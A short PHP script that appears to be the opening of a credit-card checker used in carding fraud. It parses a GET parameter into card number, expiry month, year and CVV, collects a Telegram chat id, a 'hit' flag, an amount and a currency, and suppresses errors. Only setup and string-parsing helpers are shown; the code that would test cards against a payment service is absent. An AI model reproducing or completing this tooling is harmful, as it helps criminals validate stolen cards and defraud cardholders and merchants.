<?php

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

$amount = 1;
if(isset($_GET['amt'])){
    $amount = $_GET['amt'];
} 
if ($amount > 20){
    $amount = 20;
}elseif ($amount < 1) {
	$amount = 1;
}

if(isset($_GET['tgid'])){
    $id = $_GET['tgid'];
    $hit = true;
}else{
    $hit = false;
}

if(isset($_GET['tgid'])){
    $cur = $_GET['curr'];
}

if(isset($_GET['forward'])){
    $forward = $_GET['forward'];
}

$Dark = array("amount" => "$amount","chat_id" => "$id","forward" => "$forward","currency" => "$cur","symbol" => "£");


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}


$lista = $_GET['lista'];
$cc = multiexplode(array(":", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", " ", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function value($str,$find_start,$find_end){
    $start = @strpos($str,$find_start);
    if ($start === false){
        return "";}
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));}

function mod($dividendo,$divisor){
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));}



?>
